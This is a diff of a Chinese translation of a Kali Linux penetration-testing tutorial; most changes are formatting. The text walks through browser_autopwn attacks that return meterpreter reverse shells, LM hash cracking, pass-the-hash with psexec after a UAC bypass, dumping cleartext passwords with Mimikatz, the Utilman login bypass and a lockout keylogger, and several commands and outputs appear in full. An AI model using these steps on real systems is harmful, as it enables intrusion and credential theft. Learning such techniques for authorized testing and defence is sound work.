 
 # 使用 SET 进行更高级的攻击
 
@@ -3052,13 +3159,9 @@ Fast Track 菜单下的 SCCM 向量对于任何使用 PXE 启动和公司镜像�
 
 > http://www.trustedsec.com/files/Owning_One_Rule_all_v2.pdf
 
-
-
-
-
 社会工程工具包（Social Engineering Toolkit）对于任何企业安全测试团队来说都是非常强大且功能丰富的工具。
 
-## 第 15 章 - 欺骗
+# 第 15 章：欺骗
 
 ## 使用 Subterfuge 进行自动浏览器攻击
 
@@ -3066,7 +3169,7 @@ Fast Track 菜单下的 SCCM 向量对于任何使用 PXE 启动和公司镜像�
 
 这模拟了黑客通过让用户访问恶意网站来获取目标机器的方法。一旦客户端访问此 Web 服务器，Subterfuge 就会在客户端通过 Metasploit 框架的 Browser AutoPwn 模块自动运行一系列浏览器攻击。
 
-如果其中一个（或多个）攻击成功，我们通常会获得客户端系统的完整远程命令 shell（shell）。
+如果其中一个（或多个）攻击成功，我们通常会获得客户端系统的完整远程命令 shell（`shell`）。
 
 ## 让我们开始吧
 
@@ -3076,24 +3179,27 @@ Subterfuge 是 Backtrack 平台移除的程序之一。它存在于 Backtrack 5 
 
 让我们下载 Subterfuge：
 
-- 1. 下载 Subterfuge (http://code.google.com/p/subterfuge/downloads/list)
+1. 下载 Subterfuge（http://code.google.com/p/subterfuge/downloads/list）
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_134_0.png)
 
-- 2. 将其保存到根目录。
+2. 将其保存到根目录。
 
-现在使用 `tar -xvf` 命令解压文件。
+现在使用`tar -xvf`命令解压文件。
 
-```
+```bash
 root@kali:~# ls
+
 Desktop SubterfugePublicBeta5.0.tar.gz
+
 root@kali:~# tar -xvf SubterfugePublicBeta5.0.tar.gz
 ```
 
 现在进入 Subterfuge 目录并使用 Python 安装：
 
-```
+```bash
 root@kali:~# cd subterfuge/
+
 root@kali:~/subterfuge# sudo python install.py
 ```
 
@@ -3103,29 +3209,51 @@ root@kali:~/subterfuge# sudo python install.py
 
 安装程序完成后，点击“Finish”（完成）。
 
-```
+```text
 subterfuge/sslstrip.svn/text-base/db.svn-base
+
 subterfuge/sslstrip.svn/text-base/DnsCache.py.svn-base
+
 subterfuge
+
 subterfuge
+
 subterfuge
+
 subterfuge
+
 subterfuge
+
 subterfuge
+
 subterfuge
+
 subterfuge
+
 subterfuge
+
 subterfuge
+
 subterfuge
+
 subterfuge
+
 subterfuge
+
 subterfuge
+
 subterfuge
+
 subterfuge
+
 subterfuge
+
 subterfuge
+
 subterfuge/sslstrip.log
+
 Installation Complete
+
 * - 你越安静，你听到的就越多
 ```
 
@@ -3133,8 +3261,9 @@ Installation Complete
 
 9. 现在运行 Subterfuge：
 
-```
+```bash
 root@kali:~# subteruge cd
+
 root@kali:~# subteruge
 ```
 
@@ -3142,7 +3271,7 @@ root@kali:~# subteruge
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_136_0.png)
 
-9. 现在打开 Iceweasel 并访问 127.0.0.1:80。你将看到 Subterfuge 的主界面：
+9. 现在打开 Iceweasel 并访问`127.0.0.1:80`。你将看到 Subterfuge 的主界面：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_136_1.png)
 
@@ -3155,9 +3284,7 @@ root@kali:~# subteruge
 让我们尝试 Browser_Autopwn 攻击。Subterfuge 会启动一个恶意服务器并加载大量不同的客户端攻击，并将它们用于对任何尝试连接的客户端。
 
 - 点击“Modules”菜单。
-
 - 点击“HTTP Code Injection”图标。
-
 - 我们将看到插件设置（Plugin Settings）。保持默认的“browser_autopwn”和“IFrame Injection”并点击“Apply”。
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_137_0.png)
@@ -3166,54 +3293,85 @@ root@kali:~# subteruge
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_137_1.png)
 
-```
+```text
 sh
+
 Using MSF Directory: /pentest/metasploit-4.2.0/msf3/
+
 Creating Metasploit Resource File...
+
 Exploit => use server/browser_autopwn
+
 Server IP => 192.168.1.131
+
 URIPATH => set uripath
+
 Server Port => set 8080
+
 File Created! Building injection... Serving Metasploit...
 ```
 
 5. Metasploit 攻击已加载并准备就绪：
 
-```
+```text
 Using URL: http://0.0.0.0:8080/
+
 Local IP: 192.168.1.131
+
 [*] Server started,
+
 [*] Starting exploit/browser/java_jre17_bean with payload/meterpreter/reverse_tcp
+
 Using URL: http://0.0.0.0:8080/
+
 Local IP: 192.168.1.131
+
 [*] Server started,
+
 [*] Starting exploit/browser/java_jre1_method with payload/meterpreter/reverse_tcp
+
 Using URL: http://0.0.0.0:8080/
+
 Local IP: 192.168.1.131
+
 [*] Server started,
+
 [*] Starting exploit/browser/java_jre17_provider_skeleton with payload/meterpreter/reverse_tcp
+
 Using URL: http://0.0.0.0:8080/
+
 Local IP: 192.168.1.131
+
 [*] Server started,
+
 [*] Starting exploit/browser/java_reflection_types with payload/meterpreter/reverse_tcp
+
 Using URL: http://0.0.0.0:8080/
+
 Local IP: 192.168.1.131
+
 [*] Server started,
 ```
 
 过一会儿，你会看到一个屏幕显示：
 
-```
+```text
 [*] Done, found 64 exploit modules
+
 [*] URL: http://0.0.0.0:8080/
+
 Local IP: 192.168.1.131
+
 [*] Server started.
 
-Found 64 exploits这意味着这意味着 Subterfuge 拥有 64 种不同的攻击用于有人连接 Kali。
+Found 64 exploits
+```
+
+这意味着这意味着 Subterfuge 拥有 64 种不同的攻击用于有人连接 Kali。
 
 6. 如果受害者访问我们的 subterfuge 网页（来自 Windows 7 系统），browser_autopwn 攻击就会启动并自动向浏览器发射大量攻击，如下：
 
-```
+```text
 192.168.1.132 browserautopown - Handling '/'
 192.168.1.132 browserautopown - Handling '/favicon.ico'
 192.168.1.132 browserautopown - Handling '/404/favicon.ico'
@@ -3222,7 +3380,7 @@ Found 64 exploits这意味着这意味着 Subterfuge 拥有 64 种不同的攻�
 192.168.1.132 java_atomicreferencearray - Generated jar to drop (5489 bytes).
 ```
 
-7. 查看是否有效，我们可以运行 `sessions` 命令：
+7. 查看是否有效，我们可以运行`sessions`命令：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_139_0.png)
 
@@ -3232,7 +3390,7 @@ Found 64 exploits这意味着这意味着 Subterfuge 拥有 64 种不同的攻�
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_139_1.png)
 
-起作用了。如上所示，我也输入了 shell 来打开远程提示符。
+起作用了。如上所示，我也输入了`shell`来打开远程提示符。
 
 ## 结论
 
@@ -3242,52 +3400,53 @@ Found 64 exploits这意味着这意味着 Subterfuge 拥有 64 种不同的攻�
 
 这是 Subterfuge 可以实现的功能之一。你还可以执行其他几种攻击，包括中间人类型的攻击。花些时间尝试不同的选项看看你可以做什么。
 
-# 第五部分 - 密码攻击
+# 第五部分：密码攻击
 
-## 第 16 章 – 破解简单的 LM Hash
+## 第 16 章：破解简单的 LM Hash
 
 ## 引言
-微软对 Windows XP SP3 和 Office 2003 的支持将于 2014 年 4 月 8 日正式结束。根据某些报告，在仅剩一年支持的情况下，几乎 40% 的计算机用户仍在使用。
 
-这是一个仍在业务关键位置使用的巨大 Windows XP 系统数量。计算机并不以明文存储密码，而是以加密形式存储。计算机加密密码有多种不同方法。最安全的方法之一包括对密码加“盐值”（Salting）。基本上这意味着使用一个数字（或盐值）并将其纳入哈希过程中，以确保没有两个密码是相同的。
 
-如果不使用盐值（如 LM 系统所示），基本上使用相同密码的用户将具有相同的哈希值。因此，你只需要获取哈希值并与已知哈希值进行比较，如果匹配，你就得到了密码！
 
-许多 Windows XP 系统使用 LM Hash 来保护密码。这是一种非常老且过时的密码哈希存储方法。这种哈希过程是在 Windows NT 之前创建的。
+微软对 `Windows XP SP3` 和 `Office 2003` 的支持将于 2014 年 4 月 8 日正式结束。根据某些报告，在仅剩一年支持的情况下，几乎 40% 的计算机用户仍在使用。
 
-基本上在运行 LM Hash 的系统中，任何 14 个字符或更少的密码都会转换为全大写，然后拆分为两个七字符的密码。每个部分会被加密并组合成最终的哈希值。
+这是一个仍在业务关键位置使用的巨大 `Windows XP` 系统数量。计算机并不以明文存储密码，而是以加密形式存储。计算机加密密码有多种不同方法。最安全的方法之一包括对密码加“盐值”（`Salting`）。基本上这意味着使用一个数字（或盐值）并将其纳入哈希过程中，以确保没有两个密码是相同的。
 
-再次，没有盐值，因此如果你能从系统中获取 LM Hash，你只需要与已知哈希进行查找表对比即可获得实际密码。
+如果不使用盐值（如 `LM` 系统所示），基本上使用相同密码的用户将具有相同的哈希值。因此，你只需要获取哈希值并与已知哈希值进行比较，如果匹配，你就得到了密码！
 
-典型的 Windows 哈希如下：
+许多 `Windows XP` 系统使用 `LM Hash` 来保护密码。这是一种非常老且过时的密码哈希存储方法。这种哈希过程是在 `Windows NT` 之前创建的。
+
+基本上在运行 `LM Hash` 的系统中，任何 14 个字符或更少的密码都会转换为全大写，然后拆分为两个七字符的密码。每个部分会被加密并组合成最终的哈希值。
+
+再次，没有盐值，因此如果你能从系统中获取 `LM Hash`，你只需要与已知哈希进行查找表对比即可获得实际密码。
+
+典型的 `Windows` 哈希如下：
 
 ```
 ac93c8016d14e75a29b76bb9e2cbb6:8516cd0838d1a4fd1ac3e8eb9811350
 ```
 
-LM Hash 在冒号左侧，NHash 在右侧。
+`LM Hash` 在冒号左侧，`NHash` 在右侧。
 
-在线破解 LM 密码
+## 在线破解 LM 密码
 
-有几个网站允许你输入 Windows LM Hash，它将返回所使用的密码（如果它在查找表中）。
+有几个网站允许你输入 `Windows LM Hash`，它将返回所使用的密码（如果它在查找表中）。
 
-瑞士公司 Objectif Sécurité（Ophcrack 的创建者）开发了一种在 SSD 设备上使用彩虹表的破解技术。他们提供了该技术的在线演示，可以在几秒钟破解许多 LM 密码。
+瑞士公司 `Objectif Sécurité`（`Ophcrack` 的创建者）开发了一种在 `SSD` 设备上使用彩虹表的破解技术。他们提供了该技术的在线演示，可以在几秒钟破解许多 `LM` 密码。
 
-这里是
+这里是来自 `XP` 机器的管理员密码哈希：
 
-来自 XP 机器的管理员密码哈希：
+`Hash`：`aad3b43b5b1404ceaad3b43b5b1404ee:31dccfe0d16ae931b73c59d7e0c089c0`
 
-**Hash：** aad3b43b5b1404ceaad3b43b5b1404ee:31dccfe0d16ae931b73c59d7e0c089c0
-
-将此哈希通过我们的工具放入 Objectif crack 中：
+将此哈希通过我们的工具放入 `Objectif crack` 中：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_142_0.png)
 
 看起来管理员没有设置密码，这不太妙……
 
-好吧，那个不是14个字符，让我们试试一个复杂的。
+好吧，那个不是 14 个字符，让我们试试一个复杂的。
 
-**Hash：** 17817c9fb9d272af44df1cb95cae33:6bcec2ba2597f0891987935afea300d4
+`Hash`：`17817c9fb9d272af44df1cb95cae33:6bcec2ba2597f0891987935afea300d4`
 
 结果如下：
 
@@ -3301,13 +3460,13 @@ LM Hash 在冒号左侧，NHash 在右侧。
 
 最后：
 
-**Hash：** 747747dc6e24578d18aeb7cab71d6:43c6cc2170b7a4ef851a62ff15a60555
+`Hash`：`747747dc6e24578d18aeb7cab71d6:43c6cc2170b7a4ef851a62ff15a60555`
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_142_3.png)
 
 非常令人深刻，在这次测试中仅用了四到七秒就破解了几个 14 位字符的复杂密码。
 
-诚然，这些是 Windows LM 哈希，而不是更安全的 Windows 7/Server 2008 基于 NTLM 的哈希。
+诚然，这些是 `Windows LM` 哈希，而不是更安全的 `Windows 7/Server 2008` 基于 `NTLM` 的哈希。
 
 但我相信，随着破解速度的提高，仅仅依靠密码可能不再是一个良好的安全措施了。许多公司和政府机构正在从仅使用密码转向使用双重认证方法。
 
@@ -3315,17 +3474,17 @@ LM Hash 在冒号左侧，NHash 在右侧。
 
 ## 不确定你的是哪种哈希？
 
-有几种不同类型的哈希。有时你可能获取到密码哈希，但可能无法确定它的类型。Hash ID 会识别你提供的哈希类型。
+有几种不同类型的哈希。有时你可能获取到密码哈希，但可能无法确定它的类型。`Hash ID` 会识别你提供的哈希类型。
 
-只需运行 Hash ID 并输入哈希即可。
+只需运行 `Hash ID` 并输入哈希即可。
 
 程序将检查它并返回你可能拥有的哈希类型，以及不太可能的类型。
 
-在 Kali 菜单中：
+在 `Kali` 菜单中：
 
-# Kali Linux/Password Attacks/Offline Attacks/Hash-Identifier
+`Kali Linux/Password Attacks/Offline Attacks/Hash-Identifier`
 
-只需粘贴哈希，Hash ID 就会尝试确定它的类型：
+只需粘贴哈希，`Hash ID` 就会尝试确定它的类型：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_143_0.png)
 
@@ -3343,9 +3502,9 @@ Least Possible Hashes:
 
 ## 在 Kali 中查找哈希
 
-在网上手动查找哈希很有趣，但从 Kali 内部进行更好。嗯，你可以通过 "Find my hash" 做到。
+在网上手动查找哈希很有趣，但从 `Kali` 内部进行更好。嗯，你可以通过 `Find my hash` 做到。
 
-> （顺便一下，我使用 "Find my hash" 并没有成功恢复过任何 LM 或 NTLM 密码，我觉得这很奇怪，因为有一个地方看起来很有效的 Objectif 网站。我不确定，但在处理 MD5 哈希时没有问题。）
+> （顺便一下，我使用 `Find my hash` 并没有成功恢复过任何 `LM` 或 `NTLM` 密码，我觉得这很奇怪，因为有一个地方看起来很有效的 `Objectif` 网站。我不确定，但在处理 `MD5` 哈希时没有问题。）
 
 ## findmyhash <加密> 哈希
 
@@ -3367,19 +3526,19 @@ root@kali:~#
 
 ## 结论
 
-在这一节中，我们了解到计算机并没有以明文形式存储系统数据库中的密码。密码以某种方式加密，并且生成的哈希被记录下来。我们还了解到 Windows LM 哈希并不安全，可以使用简单的查找表或“彩虹表”很容易地破解。
+在这一节中，我们了解到计算机并没有以明文形式存储系统数据库中的密码。密码以某种方式加密，并且生成的哈希被记录下来。我们还了解到 `Windows LM` 哈希并不安全，可以使用简单的查找表或“彩虹表”很容易地破解。
 
-如果在在线数据库中找不到 LM 哈希，则需要破解程序。你可以关闭 LM 哈，但安全人员发现许多网络系统仍在使用它们（为了后兼容！）。
+如果在在线数据库中找不到 `LM` 哈希，则需要破解程序。你可以关闭 `LM` 哈，但安全人员发现许多网络系统仍在使用它们（为了后兼容！）。
 
 ## 第 17 章 破解哈希
 
 ## 引言
 
-在上节中，我们查看了 LM 密码有多不安全，但 NTLM 密码呢？Windows 系统通常将 NTLM 哈希与 LM 哈希一起存储。正如提到的，许多人询问访问超过 14 个字符的密码需要多长时间。这是一个很好的问题，答案是，如果满足某些条件并使用了某种技术，花费的时间相同的。让我解释一下，如果你能从计算机中检索 LM 哈希，你就不需要破解它们。这种技术被称为“破解哈希”（Pass the Hash）。破解哈希攻击并不新颖，尽管这些攻击在已更新和打了补丁的系统上不再有效，但如果禁用了 UAC，它仍然有效。仍然值得关注破解哈希技术。
+在上节中，我们查看了 `LM` 密码有多不安全，但 `NTLM` 密码呢？`Windows` 系统通常将 `NTLM` 哈希与 `LM` 哈希一起存储。正如提到的，许多人询问访问超过 14 个字符的密码需要多长时间。这是一个很好的问题，答案是，如果满足某些条件并使用了某种技术，花费的时间相同的。让我解释一下，如果你能从计算机中检索 `LM` 哈希，你就不需要破解它们。这种技术被称为“破解哈希”（`Pass the Hash`）。破解哈希攻击并不新颖，尽管这些攻击在已更新和打了补丁的系统上不再有效，但如果禁用了 `UAC`，它仍然有效。仍然值得关注破解哈希技术。
 
 ### 使用 Psexec 传递哈希
 
-在本教程中，我们将从通过 Meterpreter 的活动会话开始。
+在本教程中，我们将从通过 `Meterpreter` 的活动会话开始。
 
 ## 活跃会话
 
@@ -3395,9 +3554,9 @@ meterpreter > getuid
 meterpreter >
 ```
 
-正如你所见，输入 "sessions" 命令查看活动会话，只有一个，所以我启动了 "sessions -i 1" 命令成功连接到 Windows 7 会话，最后输入 "getuid" 显示登录系统的活动用户，在这种情况下是 "Ralf"。
+正如你所见，输入 `sessions` 命令查看活动会话，只有一个，所以我启动了 `sessions -i 1` 命令成功连接到 `Windows 7` 会话，最后输入 `getuid` 显示登录系统的活动用户，在这种情况下是 `Ralf`。
 
-现在让我们获取系统级权限以便转储哈希。这只需通过运行书中讨论的 Bypass UAC 模块来实现，但我将在这里显示步骤：
+现在让我们获取系统级权限以便转储哈希。这只需通过运行书中讨论的 `Bypass UAC` 模块来实现，但我将在这里显示步骤：
 
 ```
 meterpreter > background
@@ -3418,7 +3577,7 @@ msf exploit(bypassac) -> *
 meterpreter >
 ```
 
-很好，用户是管理员，且 Bypass UAC 函数起了。它还自动进入了会话 2。现在只需运行 "getsystem" 命令来获取系统级凭据：
+很好，用户是管理员，且 `Bypass UAC` 函数起了。它还自动进入了会话 2。现在只需运行 `getsystem` 命令来获取系统级凭据：
 
 ```
 meterpreter > getsystem
@@ -3428,9 +3587,9 @@ meterpreter > getuid
 meterpreter >
 ```
 
-如上所示，再次使用 "getuid" 命令验证我们确实是 "System" 用户。
+如上所示，再次使用 `getuid` 命令验证我们确实是 `System` 用户。
 
-现在只需输入 "hashdump" 来恢复系统哈希：
+现在只需输入 `hashdump` 来恢复系统哈希：
 
 ```
 meterpreter > run post/windows/gather/hashdump
@@ -3442,10 +3601,9 @@ Guest:501a2ad3b3b51404eead3b4b551404e3d16cef0d0f16ea931b73c59d7e0c890:
 Free:100a2ad3b3b51404eead3b4b551404e3d16cef0d0f16ea31b73c59d7e0c890:
 ```
 
+我们需要设置系统类型的 `IP` 地址，并且已经选择了用户。这就是神奇的开始。与其输入我们不知道的密码，不如我们直接使用密码哈值即可！
 
-我们需要设置系统类型的 IP 地址，并且已经选择了用户。这就是神奇的开始。与其输入我们不知道的密码，不如我们直接使用密码哈值即可！
-
-## 5. 输入 "set SMBPass" 并复制并粘贴她的密码哈值，然后按回车：
+## 5. 输入 `set SMBPass` 并复制并粘贴她的密码哈值，然后按回车：
 
 ```
 msf exploit (psexec) > set SMBUser Alice
@@ -3455,7 +3613,8 @@ msf exploit (psexec) > set SMBPass aad3b435b5104eeaad3b435b51044ee:2e4dbf83aa056
 ```
 
 结果如何？
-在 UAC 设置为“关闭”之外任何层级的更新版 Windows 7 系统上，什么都没有发生！我们收到了“拒绝访问”（Access Denied）错误信息且没有连接：
+
+在 `UAC` 设置为“关闭”之外任何层级的更新版 `Windows 7` 系统上，什么都没有发生！我们收到了“拒绝访问”（`Access Denied`）错误信息且没有连接：
 
 ```
 msf exploit(psexec) > exploit
@@ -3467,7 +3626,7 @@ msf exploit(psexec) > exploit
 msf exploit(psexec) >
 ```
 
-但在 UAC 被完全关闭的系统上，情况就不同了：
+但在 `UAC` 被完全关闭的系统上，情况就不同了：
 
 ```
 msf exploit (psexec) > exploit
@@ -3492,15 +3651,15 @@ at 2013-09-25 12:05:28 -0400
 meterpreter >
 ```
 
-这就是在现实安全测试中会发生的情况。看起来是一个突破口可能并不起作用。因此你会备份并尝试其他方法。在这种情况下，我们无法在启用 UAC 的情况下获取 shell，但在禁用 UAC 的系统上解决了问题。
+这就是在现实安全测试中会发生的情况。看起来是一个突破口可能并不起作用。因此你会备份并尝试其他方法。在这种情况下，我们无法在启用 `UAC` 的情况下获取 `shell`，但在禁用 `UAC` 的系统上解决了问题。
 
 ## 传递哈值工具包 (Passing the Hash Toolkit)
 
-在 Kali 中，“传递哈值 (PTH) 工具包”是十个实用程序的集合，允许你使用
+在 `Kali` 中，“传递哈值 (`PTH`) 工具包”是十个实用程序的集合，允许你使用
 
-## Kali Linux/密码攻击/传递哈值
+`Kali Linux/密码攻击/传递哈值`
 
-或者在文件系统 /usr/bin/ 中：
+或者在文件系统 `/usr/bin/` 中：
 
 ```
 root@kali:~# find -name "pth-\*"
@@ -3516,9 +3675,9 @@ root@kali:~# find -name "pth-\*"
 /usr/bin/pth-winexe
 ```
 
-你可以使用这些命令来做一些非常有趣的事情。我们不会介绍具体的命令，但许多命令对 Windows 用户来说可能看起来相似。
+你可以使用这些命令来做一些非常有趣的事情。我们不会介绍具体的命令，但许多命令对 `Windows` 用户来说可能看起来相似。
 
-只需使用帮助开关 (--help)，你就会获得命令选项和用法的帮助列表：
+只需使用帮助开关 (`--help`)，你就会获得命令选项和用法的帮助列表：
 
 ```
 root@kali:~ smbget --help
@@ -3546,7 +3705,7 @@ Usage: smbget [OPTION...]
 将下载的数据写入指定文件
 ```
 
-虽然这稍微超出了本书的范围，但 Pass the Hash Toolkit 的作者在他的网站上撰写了一些非常棒的文章，其中有一篇关于如何使用传递哈值的 WMIC 命令和 PowerShell 获取远程 shell 的文章。
+虽然这稍微超出了本书的范围，但 `Pass the Hash Toolkit` 的作者在他的网站上撰写了一些非常棒的文章，其中有一篇关于如何使用传递哈值的 `WMIC` 命令和 `PowerShell` 获取远程 `shell` 的文章。
 
 (http://passing-the-hash.blogspot.com/2013/07/WMIS-PowerSploit-Shells.html)
 
@@ -3556,11 +3715,11 @@ Usage: smbget [OPTION...]
 
 那么可以做什么来防止此类攻击呢？
 
-在测试期间，我发现 Windows 7 机器内置的防火墙是一个障碍。
+在测试期间，我发现 `Windows 7` 机器内置的防火墙是一个障碍。
 
-我还发现，如果将用户账户控制 (UAC) 设置为“从不通知”之外的任何级别，许多传递哈值类型的攻击在 Windows 7 上将完全无效。
+我还发现，如果将用户账户控制 (`UAC`) 设置为“从不通知”之外的任何级别，许多传递哈值类型的攻击在 `Windows 7` 上将完全无效。
 
-而且运行良好，因为使用提供的用户 (Alice) 和密码哈值创建了远程会话：
+而且运行良好，因为使用提供的用户 (`Alice`) 和密码哈值创建了远程会话：
 
 ```
 msf exploit(handler) > sessions
@@ -3575,16 +3734,18 @@ Connection The quieter you be
 始终通知
 
 - 在以下情况下从不通知我：
+
 - 程序尝试安装软件或对我的计算机进行更改
-- 我对 Windows 设置进行更改
 
-> 不建议。仅当你需要使用不支持 Windows 7 认证的程序时才选择此项。
+- 我对 `Windows` 设置进行更改
+
+> 不建议。仅当你需要使用不支持 `Windows 7` 认证的程序时才选择此项。
 
 
 
+`meterpreter > SYSTEM`
 
 ```
-meterpreter > SYSTEM
 [+] Running as kerberos credentials
 [*] Retrieving kerberos credentials
 [+] lists credentials
@@ -3601,9 +3762,9 @@ meterpreter > SYSTEM
 | 0:1035232 | NTLM | WIN-OLANOTDQU | Ralf #LongPasswordsAreTheWayToGo! |
 ```
 
-如果你查看我们的用户 Ralf，你会看到他的明文密码！
+如果你查看我们的用户 `Ralf`，你会看到他的明文密码！
 
-在该系统中，我们通过使用“wdigest”命令获得几乎相同的结果：
+在该系统中，我们通过使用 `wdigest` 命令获得几乎相同的结果：
 
 ```
 meterpreter > wdigest
@@ -3623,9 +3784,9 @@ meterpreter > wdigest
 | 0:1035232 | NTLM | WIN-OLANOTDQU | Ralf #LongPasswordsAreTheWayToGo! |
 ```
 
-虽然在这个示例中我没有使用 Windows 8，你也可以“livesp”命令。正如 Benjamin 有天向我解释的，Windows 8 系统会将 MS Live 电子邮件帐户关联登录凭据。使用 Mimikatz，你可以通过一条命令同时获取他们的登录密码和电子邮件密码。
+虽然在这个示例中我没有使用 Windows 8，你也可以使用 `livesp` 命令。正如 Benjamin 有天向我解释的，Windows 8 系统会将 MS Live 电子邮件帐户关联登录凭据。使用 Mimikatz，你可以通过一条命令同时获取他们的登录密码和电子邮件密码。
 
-虽然这超出了本书的范围，但你也可以使用“mimikatz-command”来执行更高级的功能，包括恢复证书。
+虽然这超出了本书的范围，但你也可以使用 `mimikatz-command` 来执行更高级的功能，包括恢复证书。
 
 ## 结论
 
@@ -3649,70 +3810,69 @@ meterpreter > wdigest
 
 我有一个朋友是退休的特种部队操作员，他曾告诉我，如果你带上领带和写字板，没人会阻止你。他是对的。在我 20 年涉及银行、政府机构、研究中心和大型企业的现场服务器及 IT 支持工作中，在建筑内部，我只在三次被拦截并要求出示 ID！
 
-物理安全非常重要。在本安全教程中，我们将查看一种使用 Kali Live CD 的可能的 Windows 物理攻击，“Ultiman 登录绕过”以及强大的密码破解程序“Mimikatz”。
+物理安全非常重要。在本安全教程中，我们将查看一种使用 Kali Live CD 的可能的 Windows 物理攻击，`Ultiman 登录绕过`以及强大的密码破解程序 `Mimikatz`。
 
 ## Ultiman 登录绕过
 
-好了，这种技术非常老了，而且从技术上讲不算攻击。它源于旧版 Microsoft Technet Active Directory 支持论坛的一条信息。这种被称为“Ultiman 绕过”的技术，是在你忘记密码时登录 Windows 服务器的一种被推荐的技术。
+好了，这种技术非常老了，而且从技术上讲不算攻击。它源于旧版 Microsoft Technet Active Directory 支持论坛的一条信息。这种被称为 `Ultiman 绕过`的技术，是在你忘记密码时登录 Windows 服务器的一种被推荐的技术。
 
-Ultiman 绕过通过操纵登录界面处可用的一个辅助 Windows 函数来实现。它允许在不使用凭据的情况下打开系统级命令会话。
+`Ultiman 绕过`通过操纵登录界面处可用的一个辅助 Windows 函数来实现。它允许在不使用凭据的情况下打开系统级命令会话。
 
 我一些支持大型网络的朋友告诉我，他们仍然会出于合法目的使用这种技术。例如，当旧的企业版立式系统需要备份和重新利用，且没人能记得系统密码时，他们会使用这种技术。
 
-要执行此过程，你需要一个 (Kali) Linux 启动盘。我们将从磁盘启动并修改 Windows “Ultiman”程序，这样按下“Windows” + “U”键时，将打开命令提示符而不是实用菜单。
+要执行此过程，你需要一个 (Kali) Linux 启动盘。我们将从磁盘启动并修改 Windows `Ultiman`程序，这样按下 `Windows` + `U`键时，将打开命令提示符而不是实用菜单。
 
 > **警告！！！**
+
 > 警告：在此过程中操作不当可能会导致你的 Windows 系统无法启动。你已收到警告。
 
-- 1. 在 Windows 系统上，从 Kali Live CD 启动：
+1. 在 Windows 系统上，从 Kali Live CD 启动：
 
 ![](img/ff9cd19afe449)
 
-- 2. 启动后，点击桌面。
+2. 启动后，点击桌面。
 
 ![](img/ff9cd19afe449)
 
-- 3. 导航到 Windows\System32 目录：
+3. 导航到 `Windows\System32`目录：
 
 ![](img/ff9cd19afe449)
 
-- 4. 将 utilman.exe 重命名为 utilman.old：
+4. 将 `utilman.exe`重命名为 `utilman.old`：
 
 ![](img/ff9cd19afe449)
 
-- 5. 创建 cmd.exe 的副本并重命名：
+5. 创建 `cmd.exe`的副本并重命名：
 
 ![](img/ff9cd19afe449)
 
-- 6. 将 cmd.exe 的副本重命名为 utilman.exe：
+6. 将 `cmd.exe`的副本重命名为 `utilman.exe`：
 
 ![](img/ff9cd19afe449)
 
-- 7. 直接关机让 Windows 正常启动。
+7. 直接关机让 Windows 正常启动。
 
 ![](img/ff9cd19afe449)
 
-- 8. 在登录界面，同时按下“Windows”和“u”键：
+8. 在登录界面，同时按下 `Windows`和 `u`键：
 
 ![](img/ff9cd19afe449)
 
-- 9. 输入“whoami”，你会看到你是 nt authority\system：
+9. 输入 `whoami`，你会看到你是 `nt authority\system`：
 
 ![](img/ff9cd19afe449)
-
-
-
 
 Kiwi 的博客：
 
-http://blog.gentilkiwi.com/mimikatz
+`http://blog.gentilkiwi.com/mimikatz`
 
-- 1. 再次，你需要在早些时候就已经安装了上面的“Utilman 破解（Utilman Bypass）”。
-- 2. 在锁定的 Windows 桌面上，按下“windows”和“u”键。
+1. 再次，你需要在早些时候就已经安装了上面的 `Utilman 破解（Utilman Bypass）`。
+
+2. 在锁定的 Windows 桌面上，按下 `windows`和 `u`键。
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_160_0.png)
 
-- 3. 输入“whoami”以验证我们是否处于系统级权限状态：
+3. 输入 `whoami`以验证我们是否处于系统级权限状态：
 
 ```
 C:\Windows\system32>whoami
@@ -3720,7 +3880,7 @@ nt authority
 c:\Windows\system32>_
 ```
 
-- 4. 导航到你的 USB 驱动器。在我的系统中它是 E: 盘：
+4. 导航到你的 USB 驱动器。在我的系统中它是 `E:`盘：
 
 ```
 E:\mimikatz
@@ -3738,7 +3898,7 @@ Directory of E:\mimikatz
 E:\>_
 ```
 
-- 5. 进入你的 mimikatz 目录，根据你的目标操作系统选择 Win32 或 x64 位版本。
+5. 进入你的 `mimikatz`目录，根据你的目标操作系统选择 `Win32`或 `x64`位版本。
 
 ```
 E:\>cd mimikatz
@@ -3760,7 +3920,7 @@ Directory of E:\mimikatz\Win32
 E:\mimikatz\Win32>_
 ```
 
-- 6. 进入正确的 mimikatz 目录后，运行“mimikatz”。
+6. 进入正确的 `mimikatz`目录后，运行 `mimikatz`。
 
 ```
 mimikatz>
@@ -3772,13 +3932,11 @@ mimikatz #
 
 是的，一切都很正常，但你会没问题的，相信我。
 
-- 7. 输入“sekurlsa::logonPasswords”：
+7. 输入 `sekurlsa::logonPasswords`：
 
 ```
 sekurlsa::logonPasswords
 ```
-
-
 
 现在继续重新启动键盘记录，锁定 Windows 7 工作站并重新登录。然后转储键日志以查看用户密码：
 
@@ -3792,7 +3950,8 @@ meterpreter >
 ```
 
 我们拿到了！
-在上面的图片中，注意到锁定桌面的“Windows” + “L”组合键并没有出现。这是因为我们现在正在监控的是 `winologon` 会话密钥缓冲区，所以它不会被显示出来。我们已经有了密码。
+
+在上面的图片中，注意到锁定桌面的 `Windows` + `L`组合键并没有出现。这是因为我们现在正在监控的是 `winologon` 会话密钥缓冲区，所以它不会被显示出来。我们已经有了密码。
 
 所以本质上，我们的目标需要再喝杯咖啡才能度过忙碌的冲浪的一天，他锁定了桌面然后重新登录。就在这时，我们成功抓取了他完整的 28 位字符密码。
 
@@ -3806,9 +3965,9 @@ meterpreter >
 
 最后，如果脚本能在用户重新登录时通知你，并提供他密码的文本转储，那就更完美了。
 
-认识一下“Lockout_Keylogger”，这是一个由 CG 和 Mubix 制作的惊 de脚本。
+认识一下 `Lockout_Keylogger`，这是一个由 CG 和 Mubix 制作的惊 de脚本。
 
-- 1. 需要启动一个具有“system”级权限的活动远程会话。
+1. 需要启动一个具有 `system`级权限的活动远程会话。
 
 ```
 meterpreter > getuid
